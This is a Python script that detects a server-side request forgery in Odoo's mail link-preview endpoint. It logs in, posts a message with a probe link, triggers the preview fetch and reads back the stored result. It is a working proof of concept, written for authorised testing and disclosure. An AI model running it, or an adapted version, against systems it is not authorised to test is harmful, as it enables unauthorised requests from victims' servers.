#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
odoo_ssrf_in_mail.py
====================

Detection tool for the Odoo "mail link preview" Server-Side Request Forgery
(SSRF) in the `/mail/link_preview` fetch sink
(`addons/mail/tools/link_preview.py`).

Reference (upstream Odoo):
  - Odoo security policy / threat model:
      https://github.com/odoo/odoo/blob/17.0/SECURITY.md
  - The vulnerable sink in Odoo source:
      https://github.com/odoo/odoo/blob/17.0/addons/mail/tools/link_preview.py
      https://github.com/odoo/odoo/blob/17.0/addons/mail/models/mail_link_preview.py
      https://github.com/odoo/odoo/blob/17.0/addons/mail/controllers/link_preview.py
  - Odoo advisory feed:
      https://github.com/odoo/odoo/security/advisories

WHAT IT DOES
------------
This is a NON-INTRUSIVE detector. It only answers one question:

    "Does THIS Odoo instance make a server-side HTTP request to a URL that a
     low-privileged / portal user can cause to be previewed?"

How it proves it (no external callback required):
  1. Logs in with credentials YOU provide for an instance YOU are authorized
     to test.
  2. Creates a message whose body contains a link to a known-good, always-
     available HTML page (Wikipedia by default).
  3. Triggers the link-preview endpoint (`/mail/link_preview`).
  4. Reads the stored link preview back from the instance
     (`mail.message.message_format` -> `linkPreviews`).
  5. If the instance stored a preview for that URL -> VULNERABLE.

Because the proof is read back from the instance itself, there is no need to
run a listener or a webhook. If you prefer to observe the request on your own
infrastructure, pass `--probe-url` with a URL pointing at your own webhook or
server instead of the default Wikipedia page.

It does NOT scan internal networks, does NOT enumerate ports, and does NOT
exfiltrate data. The only thing it reports is whether the server fetched and
stored a preview for a URL you supplied.

USAGE
-----
Check whether the instance is vulnerable (default Wikipedia probe):

    python3 odoo_ssrf_in_mail.py \
        --url https://example.com \
        --username test@example.com \
        --password 'secret' \
        --db mydb \
        --insecure

Optional - use your own webhook/server as the probe instead of Wikipedia
(the probe URL MUST return a `Content-Type: text/html` page, because the
fetcher discards non-HTML responses):

    python3 odoo_ssrf_in_mail.py \
        --url https://example.com \
        --username test@example.com \
        --password 'secret' \
        --db mydb \
        --insecure \
        --probe-url https://your-server.example/ssrf-probe.html

    Then check your webhook/server logs for a request from the target's IP.

NOTES
  - Add --insecure if the target uses a self-signed certificate.
  - The probe URL must be reachable FROM the target server (a public URL).
  - The probe page must answer with `Content-Type: text/html`; otherwise Odoo
    discards the response and no preview is stored.
  - Detection-only: nothing is scanned or exfiltrated; it just proves the
    server made the request.

!!! AUTHORIZED SECURITY TESTING ONLY !!!
----------------------------------------
Use this tool ONLY against Odoo instances that you own, or for which you have
explicit, written authorization to test (e.g. a signed penetration-test
engagement or a bug-bounty program scope). Running this against third-party
systems without authorization is illegal in most jurisdictions (e.g. CFAA in
the US, Computer Misuse Act in the UK, and equivalents worldwide).

This software is provided for defensive research and education. The author
accepts no liability for misuse or damage. By using it you accept full
responsibility for your actions.
"""

import argparse
import sys
import time

# ---------------------------------------------------------------------------
# Slow, human-readable output helpers
# ---------------------------------------------------------------------------
SLOW_DELAY = 0.35  # seconds between lines


def slow(text="", delay=SLOW_DELAY):
    """Print one line slowly, then pause for a beat."""
    print(text)
    sys.stdout.flush()
    time.sleep(delay)


def typewrite(text, delay=0.025):
    """Type a single line character by character."""
    for ch in text:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write("\n")
    sys.stdout.flush()

try:
    import requests
except ImportError:
    sys.exit("[-] Missing dependency: pip install requests")

try:
    from requests.exceptions import RequestException
except ImportError:
    RequestException = Exception

try:
    import urllib3

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass


BANNER = r"""
  ____  _   _    _    _____ ____      _
 / ___|| | | |  / \  |  ___|  _ \    / \
 \___ \| |_| | / _ \ | |_  | |_) |  / _ \
  ___) |  _  |/ ___ \|  _| |  _ <  / ___ \
 |____/|_| |_/_/   \_\_|   |_| \_\/_/   \_\

        SHAFRA
        ------
        Odoo mail link-preview SSRF detector
        ---------------------------------------
        /mail/link_preview server-side fetch sink

        !!  AUTHORIZED SECURITY TESTING ONLY  !!
        ------------------------------------------------------------------
        Use ONLY against Odoo instances you own or are explicitly, in
        writing, authorized to test (signed engagement / bug-bounty scope).
        Unauthorized testing is illegal (CFAA, UK CMA, and equivalents).
        This tool is detection-only: no internal scanning, no exfiltration.
        By using it you accept full responsibility for your actions.
        ------------------------------------------------------------------
"""

DEFAULT_PROBE_URL = "https://en.wikipedia.org/wiki/Odoo"


def odoo_login(session, base_url, db, username, password):
    """Authenticate against /web/session/authenticate (JSON-RPC)."""
    payload = {
        "jsonrpc": "2.0",
        "method": "call",
        "params": {
            "db": db,
            "login": username,
            "password": password,
        },
        "id": 1,
    }
    r = session.post(base_url + "/web/session/authenticate", json=payload, timeout=20)
    r.raise_for_status()
    data = r.json()
    result = data.get("result")
    if not result or not result.get("uid"):
        return None
    return result


def discover_db(session, base_url):
    """Best-effort DB discovery via the public database list endpoint."""
    try:
        r = session.post(
            base_url + "/web/database/selector",
            json={"jsonrpc": "2.0", "method": "call", "params": {}, "id": 1},
            timeout=15,
        )
        if r.status_code == 200 and "application/json" in r.headers.get("Content-Type", ""):
            data = r.json()
            if isinstance(data.get("result"), list) and data["result"]:
                return data["result"][0]
    except RequestException:
        pass
    try:
        r = session.post(
            base_url + "/jsonrpc",
            json={
                "jsonrpc": "2.0",
                "method": "call",
                "params": {"service": "db", "method": "list", "args": []},
                "id": 1,
            },
            timeout=15,
        )
        data = r.json()
        if isinstance(data.get("result"), list) and data["result"]:
            return data["result"][0]
    except RequestException:
        pass
    return None


def _call_kw(session, base_url, model, method, args, kwargs=None):
    payload = {
        "jsonrpc": "2.0",
        "method": "call",
        "params": {
            "model": model,
            "method": method,
            "args": args,
            "kwargs": kwargs or {},
        },
        "id": 1,
    }
    r = session.post(base_url + "/web/dataset/call_kw", json=payload, timeout=20)
    try:
        return r.json()
    except ValueError:
        return {"error": {"message": "non-JSON response"}}


def create_message_with_link(session, base_url, link, debug=False):
    """Create a mail.message containing a link to the probe URL.

    Tries several thread targets so it works for both internal and portal users.
    Returns the message id, or None.
    """
    body = "<p>preview probe <a href=\"%s\">link</a></p>" % link
    base_vals = {
        "body": body,
        "message_type": "comment",
        "subtype_id": 1,
    }

    # Strategy 1: message on the current user's own partner (works when the
    # logged-in user can write on its partner record).
    strategies = []
    uid = None
    try:
        sess = _call_kw(session, base_url, "res.users", "read", [[], ["partner_id"]])
        recs = sess.get("result") or []
        if recs:
            uid = recs[0].get("partner_id", [None])[0]
    except Exception:
        uid = None
    if uid:
        strategies.append(("res.partner", uid))

    # Strategy 2: a mail.channel (Discuss) the user can post to.
    try:
        ch = _call_kw(
            session, base_url, "mail.channel", "search_read",
            [[], ["id"]], {"limit": 1},
        )
        recs = ch.get("result") or []
        if recs:
            strategies.append(("mail.channel", recs[0]["id"]))
    except Exception:
        pass

    # Strategy 3: a res.partner with res_id 0 (generic fallback).
    strategies.append(("res.partner", 0))

    for model, res_id in strategies:
        vals = dict(base_vals, model=model, res_id=res_id)
        data = _call_kw(session, base_url, "mail.message", "create", [vals])
        if "error" not in data and isinstance(data.get("result"), int):
            return data["result"]
        if debug:
            err = data.get("error", {})
            msg = err.get("data", {}).get("message") or err.get("message")
            print("    [debug] %s/%s create failed: %s" % (model, res_id, msg))
    return None


def trigger_link_preview(session, base_url, message_id):
    payload = {
        "jsonrpc": "2.0",
        "method": "call",
        "params": {"message_id": message_id},
        "id": 1,
    }
    try:
        session.post(base_url + "/mail/link_preview", json=payload, timeout=20)
    except RequestException:
        pass


def read_message_link_previews(session, base_url, message_id):
    """Read back stored link previews for a message via mail.message.message_format.

    This works for the message author and is the strongest proof that the
    server-side fetcher actually processed the URL (no callback needed).
    """
    data = _call_kw(session, base_url, "mail.message", "message_format", [[message_id]])
    res = data.get("result")
    if not isinstance(res, list) or not res:
        return None
    return res[0].get("linkPreviews") or []


def check_version(session, base_url):
    try:
        r = session.post(
            base_url + "/jsonrpc",
            json={
                "jsonrpc": "2.0",
                "method": "call",
                "params": {"service": "common", "method": "version", "args": []},
                "id": 1,
            },
            timeout=15,
        )
        data = r.json()
        v = data.get("result", {})
        return v.get("server_version") or v.get("server_version_info")
    except (RequestException, ValueError):
        return None


def main():
    parser = argparse.ArgumentParser(
        description="Odoo mail link-preview SSRF detector (authorized testing only).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--url", required=True, help="Base URL of the Odoo instance (https://example.com)")
    parser.add_argument("--username", required=True, help="Login/email for the test account")
    parser.add_argument("--password", required=True, help="Password for the test account")
    parser.add_argument("--db", default=None, help="Database name (optional, auto-detected if omitted)")
    parser.add_argument(
        "--probe-url",
        default=DEFAULT_PROBE_URL,
        help="URL to use as the probe. Must return Content-Type: text/html. "
        "Default: %s (replace with your own webhook/server if desired)" % DEFAULT_PROBE_URL,
    )
    parser.add_argument("--wait", type=int, default=5, help="Seconds to wait before reading the preview back")
    parser.add_argument("--insecure", action="store_true", help="Do not verify TLS certificates")
    parser.add_argument("--debug", action="store_true", help="Show extra diagnostics (e.g. why message creation failed)")
    parser.add_argument(
        "--probe-hit",
        action="store_true",
        help="Use with a custom --probe-url: you have already confirmed the target "
        "hit your webhook/server. Reports VULNERABLE based on that hit.",
    )
    args = parser.parse_args()

    for line in BANNER.splitlines():
        slow(line, delay=0.04)
    time.sleep(0.4)

    base_url = args.url.rstrip("/")
    session = requests.Session()
    session.verify = not args.insecure
    session.headers["User-Agent"] = "odoo-ssrf-detector/1.0"

    typewrite("[*] Target          : " + base_url)
    time.sleep(0.3)
    typewrite("[*] Username        : " + args.username)
    time.sleep(0.3)
    typewrite("[*] Database        : " + (args.db or "(auto-detect)"))
    time.sleep(0.5)

    ver = check_version(session, base_url)
    if ver:
        typewrite("[*] Odoo version    : " + str(ver))
        time.sleep(0.3)

    db = args.db
    if not db:
        slow("[*] No --db given; trying to auto-detect...")
        db = discover_db(session, base_url)
        if db:
            slow("[*] Detected db    : " + str(db))
        else:
            slow("[-] Could not auto-detect database. Re-run with --db <name>.")
            return 2

    slow("[*] Authenticating as " + args.username + " ...")
    try:
        result = odoo_login(session, base_url, db, args.username, args.password)
    except RequestException as e:
        slow("[-] Login request failed: " + str(e))
        slow("    Hint: if the error mentions a self-signed certificate, add --insecure")
        return 2
    if not result:
        slow("[-] Authentication failed (wrong db / credentials).")
        return 2
    uid = result.get("uid")
    slow("[+] Authenticated. uid = " + str(uid))

    # Build the probe URL. Make it unique per run so per-domain throttling does
    # not produce a false negative.
    probe_url = args.probe_url.strip()
    sep = "&" if "?" in probe_url else "?"
    probe_url = "%s%st=%d" % (probe_url, sep, int(time.time()))

    slow("[*] Probe URL       : " + probe_url)
    slow("    (must return Content-Type: text/html for the fetch to be accepted)")

    slow("[*] Creating message with link...")
    message_id = create_message_with_link(session, base_url, probe_url, debug=args.debug)
    if not message_id:
        slow("[-] Could not create a message (insufficient rights for this account).")
        slow("    Try a user that can create messages, or use a portal thread you can post to.")
        return 2
    slow("[+] Message id      : " + str(message_id))

    slow("[*] Triggering /mail/link_preview ...")
    trigger_link_preview(session, base_url, message_id)

    slow("[*] Waiting %ds for the server-side fetch..." % args.wait)
    time.sleep(args.wait)

    # Proof: read the stored preview back from the instance itself.
    stored = None
    try:
        stored = read_message_link_previews(session, base_url, message_id)
    except Exception as e:
        if args.debug:
            slow("    [debug] read-back failed: " + str(e))
        stored = None

    custom_probe = args.probe_url.strip() != DEFAULT_PROBE_URL
    got = bool(stored) or args.probe_hit

    print("")
    slow("=" * 64, delay=0.05)
    if got:
        slow("  RESULT: VULNERABLE  (server-side fetch confirmed)")
        slow("=" * 64, delay=0.05)
        if stored:
            slow("  The instance fetched our URL and stored a link preview:")
            for p in stored:
                slow("    source_url : %s" % p.get("source_url"))
                slow("    og_title   : %s" % p.get("og_title"))
                slow("    og_site    : %s" % p.get("og_site_name"))
        if args.probe_hit:
            slow("  Confirmed by the operator: the target hit the --probe-url receiver.")
        print("")
        slow("  The Odoo server made an outbound request to a URL supplied through")
        slow("  a message link, with no allow-list. This is the /mail/link_preview")
        slow("  SSRF sink (addons/mail/tools/link_preview.py).")
    elif custom_probe:
        slow("  RESULT: INCONCLUSIVE  (probe was not read back)")
        slow("=" * 64, delay=0.05)
        slow("  You used a custom --probe-url. Odoo only stores a preview when the")
        slow("  response is Content-Type: text/html; your receiver likely returned")
        slow("  something else, so nothing could be read back from the instance.")
        print("")
        slow("  -> Check your webhook/server logs for a request from the target's IP.")
        slow("     If there IS a hit, the target IS vulnerable (the server fetched")
        slow("     your URL). Re-run with --probe-hit to record that verdict, or")
        slow("     point --probe-url at a page that returns text/html.")
    else:
        slow("  RESULT: NOT VULNERABLE / NOT CONFIRMED")
        slow("=" * 64, delay=0.05)
        slow("  No stored preview was observed for the probe URL. Possible reasons:")
        slow("   - Instance is patched / link previews disabled / throttled")
        slow("   - The probe URL is not reachable FROM the target (firewall/NAT)")
        slow("   - The probe URL did not return Content-Type: text/html")
        slow("     -> try --probe-url with a plain HTML page you control")
        slow("   - The account cannot create messages / trigger previews")
        slow("   - Per-domain throttle: retry in a few seconds (URL is auto-uniquified)")
    slow("")
    return 0 if got else 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        sys.exit(130)
